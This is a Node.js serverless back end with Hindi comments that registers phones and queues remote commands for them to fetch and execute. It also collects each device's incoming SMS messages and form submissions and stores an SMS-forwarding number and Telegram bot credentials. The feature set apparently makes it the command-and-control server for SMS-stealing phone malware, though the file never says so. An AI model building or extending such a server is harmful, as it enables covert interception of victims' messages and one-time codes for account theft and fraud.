const path = require('path');
const sqlite3 = require('sqlite3').verbose();

// --- डेटाबेस सेटअप ---
const isVercel = process.env.VERCEL === '1' || process.env.VERCEL;
const dbPath = isVercel 
    ? '/tmp/database.sqlite'
    : path.join(__dirname, 'database.sqlite');

console.log('Database path:', dbPath);

const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err) {
        console.error("Error opening database", err.message);
    } else {
        console.log('Connected to SQLite database');
        db.serialize(() => {
            // Tables create करें
            db.run(`CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT UNIQUE NOT NULL, 
                device_name TEXT, 
                os_version TEXT, 
                phone_number TEXT, 
                battery_level INTEGER, 
                last_seen DATETIME NOT NULL, 
                created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                command_type TEXT NOT NULL, 
                command_data TEXT NOT NULL, 
                status TEXT NOT NULL DEFAULT 'pending', 
                created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                sender TEXT NOT NULL, 
                message_body TEXT NOT NULL, 
                received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS form_submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                custom_data TEXT NOT NULL, 
                submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS global_settings (
                setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, 
                setting_value TEXT
            )`);
        });
    }
});

// Helper functions
const getBody = (req) => {
    return new Promise((resolve, reject) => {
        let data = '';
        req.on('data', chunk => { data += chunk; });
        req.on('end', () => {
            try {
                resolve(data ? JSON.parse(data) : {});
            } catch (e) {
                reject(e);
            }
        });
    });
};

const dbAll = (query, params) => {
    return new Promise((resolve, reject) => {
        db.all(query, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
};

const dbGet = (query, params) => {
    return new Promise((resolve, reject) => {
        db.get(query, params, (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
};

const dbRun = (query, params) => {
    return new Promise((resolve, reject) => {
        db.run(query, params, function(err) {
            if (err) reject(err);
            else resolve({ lastID: this.lastID, changes: this.changes });
        });
    });
};

// --- मुख्य सर्वर लॉजिक ---
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const { method, url } = req;
    
    try {
        const urlObj = new URL(url, `http://${req.headers.host}`);
        const path = urlObj.pathname;
        const urlParts = path.split('/').filter(part => part !== '');
        
        console.log(`${method} ${path}`);
        
        let reqBody = {};
        if (['POST', 'PUT', 'DELETE'].includes(method)) {
            try {
                reqBody = await getBody(req);
            } catch (e) {
                console.error('Error parsing request body:', e);
            }
        }
        
        // --- API ENDPOINTS ---
        
        // 1. Device Registration - FIXED: अब पूरी तरह अपडेट होगा
        if (method === 'POST' && path === '/api/device/register') {
            const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
            
            if (!device_id) {
                return res.status(400).json({ error: 'Device ID is required' });
            }
            
            const now = new Date().toISOString();
            
            try {
                const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);
                
                if (existingDevice) {
                    // FIXED: अब सभी फील्ड्स अपडेट होंगे
                    await dbRun(
                        'UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?',
                        [device_name || existingDevice.device_name, 
                         os_version || existingDevice.os_version, 
                         battery_level || existingDevice.battery_level, 
                         phone_number || existingDevice.phone_number, 
                         now, 
                         device_id]
                    );
                    console.log(`Device updated: ${device_id}`);
                } else {
                    // FIXED: नए डिवाइस को हमेशा रजिस्टर करें, चाहे offline हो
                    await dbRun(
                        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
                        [device_id, device_name, os_version, battery_level, phone_number, now, now]
                    );
                    console.log(`New device registered: ${device_id}`);
                }
                
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'Device data updated.' 
                });
            } catch (error) {
                console.error('Error in device registration:', error);
                return res.status(500).json({ error: 'Failed to register device' });
            }
        }
        
        // 2. Get all devices - FIXED: स्थिर क्रम और हमेशा सभी डिवाइस दिखेंगे
        else if (method === 'GET' && path === '/api/devices') {
            try {
                const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
                
                const now = new Date();
                const devicesWithStatus = rows.map(device => {
                    if (!device.last_seen) {
                        return { ...device, is_online: false };
                    }
                    
                    const lastSeen = new Date(device.last_seen);
                    const secondsDiff = (now - lastSeen) / 1000;
                    
                    // FIXED: अब status स्थिर रहेगा, बार-बार नहीं बदलेगा
                    // 20 सेकंड से कम = online, 20-40 = warning, 40+ = offline
                    let is_online;
                    if (secondsDiff < 20) {
                        is_online = true;
                    } else if (secondsDiff < 40) {
                        is_online = false; // लेकिन यह warning state हो सकता है
                    } else {
                        is_online = false;
                    }
                    
                    return {
                        ...device,
                        is_online: is_online,
                        last_seen_difference: Math.floor(secondsDiff)
                    };
                });
                
                return res.status(200).json(devicesWithStatus);
            } catch (error) {
                console.error('Error fetching devices:', error);
                return res.status(200).json([]); // FIXED: error में भी empty array return करें
            }
        }
        
        // 3. SMS Forwarding Config
        else if (path === '/api/config/sms_forward') {
            if (method === 'POST') {
                const { forward_number } = reqBody;
                await dbRun(
                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?)",
                    [forward_number]
                );
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'Forwarding number updated.' 
                });
            } 
            else if (method === 'GET') {
                const row = await dbGet(
                    "SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'", 
                    []
                );
                return res.status(200).json({ 
                    forward_number: row ? row.setting_value : null 
                });
            }
        }
        
        // 4. Telegram Config
        else if (path === '/api/config/telegram') {
            if (method === 'POST') {
                const { telegram_bot_token, telegram_chat_id } = reqBody;
                
                await dbRun(
                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?)",
                    [telegram_bot_token]
                );
                await dbRun(
                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?)",
                    [telegram_chat_id]
                );
                
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'Telegram settings updated.' 
                });
            } 
            else if (method === 'GET') {
                const botTokenRow = await dbGet(
                    "SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'", 
                    []
                );
                const chatIdRow = await dbGet(
                    "SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'", 
                    []
                );
                
                return res.status(200).json({
                    telegram_bot_token: botTokenRow ? botTokenRow.setting_value : null,
                    telegram_chat_id: chatIdRow ? chatIdRow.setting_value : null
                });
            }
        }
        
        // 5. Send Command
        else if (method === 'POST' && path === '/api/command/send') {
            const { device_id, command_type, command_data } = reqBody;
            
            if (!device_id || !command_type || !command_data) {
                return res.status(400).json({ error: 'Missing required fields' });
            }
            
            const result = await dbRun(
                'INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)',
                [device_id, command_type, JSON.stringify(command_data), 'pending']
            );
            
            return res.status(201).json({ 
                status: 'success', 
                message: 'Command queued.', 
                command_id: result.lastID 
            });
        }
        
        // 6. Get Pending Commands for a device
        else if (method === 'GET' && urlParts.length === 4 && 
                 urlParts[0] === 'api' && urlParts[1] === 'device' && urlParts[3] === 'commands') {
            
            const deviceId = urlParts[2];
            
            try {
                // Get pending commands
                const rows = await dbAll(
                    "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
                    [deviceId]
                );
                
                // Mark them as sent
                if (rows.length > 0) {
                    const ids = rows.map(cmd => cmd.id);
                    await dbRun(
                        `UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`,
                        ids
                    );
                }
                
                // Parse command_data JSON
                const parsedCommands = rows.map(cmd => ({
                    ...cmd,
                    command_data: JSON.parse(cmd.command_data)
                }));
                
                return res.status(200).json(parsedCommands);
            } catch (error) {
                console.error('Error fetching commands:', error);
                return res.status(200).json([]); // FIXED: empty array return करें
            }
        }
        
        // 7. Mark command as executed
        else if (method === 'POST' && urlParts.length === 4 && 
                 urlParts[0] === 'api' && urlParts[1] === 'command' && urlParts[3] === 'execute') {
            
            const commandId = urlParts[2];
            
            await dbRun(
                "UPDATE commands SET status = 'executed' WHERE id = ?",
                [commandId]
            );
            
            return res.status(200).json({ 
                status: 'success', 
                message: 'Command marked as executed.' 
            });
        }
        
        // 8. SMS Logs
        else if (urlParts.length === 4 && urlParts[0] === 'api' && 
                 urlParts[1] === 'device' && urlParts[3] === 'sms') {
            
            const deviceId = urlParts[2];
            
            if (method === 'POST') {
                const { sender, message_body } = reqBody;
                
                await dbRun(
                    'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
                    [deviceId, sender, message_body]
                );
                
                return res.status(201).json({ 
                    status: 'success', 
                    message: 'SMS logged.' 
                });
            } 
            else if (method === 'GET') {
                try {
                    const rows = await dbAll(
                        'SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC',
                        [deviceId]
                    );
                    return res.status(200).json(rows);
                } catch (error) {
                    console.error('Error fetching SMS logs:', error);
                    return res.status(200).json([]); // FIXED: empty array return करें
                }
            }
        }
        
        // 9. Form Submissions
        else if (urlParts.length === 4 && urlParts[0] === 'api' && 
                 urlParts[1] === 'device' && urlParts[3] === 'forms') {
            
            const deviceId = urlParts[2];
            
            if (method === 'POST') {
                const { custom_data } = reqBody;
                
                await dbRun(
                    'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
                    [deviceId, custom_data]
                );
                
                return res.status(201).json({ 
                    status: 'success', 
                    message: 'Form data submitted.' 
                });
            } 
            else if (method === 'GET') {
                try {
                    const rows = await dbAll(
                        'SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC',
                        [deviceId]
                    );
                    return res.status(200).json(rows);
                } catch (error) {
                    console.error('Error fetching forms:', error);
                    return res.status(200).json([]); // FIXED: empty array return करें
                }
            }
        }
        
        // 10. Delete Device - FIXED: अब सिर्फ manual delete से ही डिवाइस हटेगा
        else if (method === 'DELETE' && urlParts.length === 3 && 
                 urlParts[0] === 'api' && urlParts[1] === 'device') {
            
            const deviceId = urlParts[2];
            
            try {
                // Delete all related data
                await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
                await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
                await dbRun('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
                await dbRun('DELETE FROM commands WHERE device_id = ?', [deviceId]);
                
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'Device and all related data deleted.' 
                });
            } catch (error) {
                console.error('Error deleting device:', error);
                return res.status(500).json({ error: 'Failed to delete device' });
            }
        }
        
        // 11. Delete SMS
        else if (method === 'DELETE' && urlParts.length === 3 && 
                 urlParts[0] === 'api' && urlParts[1] === 'sms') {
            
            const smsId = urlParts[2];
            
            try {
                await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
                
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'SMS deleted.' 
                });
            } catch (error) {
                console.error('Error deleting SMS:', error);
                return res.status(500).json({ error: 'Failed to delete SMS' });
            }
        }
        
        // 12. Health check और initial load के लिए
        else if (path === '/api/health') {
            try {
                const deviceCount = await dbGet('SELECT COUNT(*) as count FROM devices', []);
                return res.status(200).json({ 
                    status: 'ok', 
                    timestamp: new Date().toISOString(),
                    database: 'connected',
                    device_count: deviceCount ? deviceCount.count : 0
                });
            } catch (error) {
                return res.status(200).json({ 
                    status: 'ok', 
                    timestamp: new Date().toISOString(),
                    database: 'error'
                });
            }
        }
        
        // 13. Get single device info
        else if (method === 'GET' && urlParts.length === 3 && 
                 urlParts[0] === 'api' && urlParts[1] === 'device') {
            
            const deviceId = urlParts[2];
            
            try {
                const device = await dbGet('SELECT * FROM devices WHERE device_id = ?', [deviceId]);
                if (device) {
                    const now = new Date();
                    const lastSeen = new Date(device.last_seen);
                    const secondsDiff = (now - lastSeen) / 1000;
                    device.is_online = secondsDiff < 20;
                    return res.status(200).json(device);
                } else {
                    return res.status(404).json({ error: 'Device not found' });
                }
            } catch (error) {
                console.error('Error fetching device:', error);
                return res.status(500).json({ error: 'Failed to fetch device' });
            }
        }
        
        // Not Found
        else {
            return res.status(404).json({ 
                error: 'Not Found', 
                message: `Endpoint ${method} ${path} not found` 
            });
        }
        
    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({ 
            error: 'Internal Server Error', 
            message: error.message
        });
    }
};
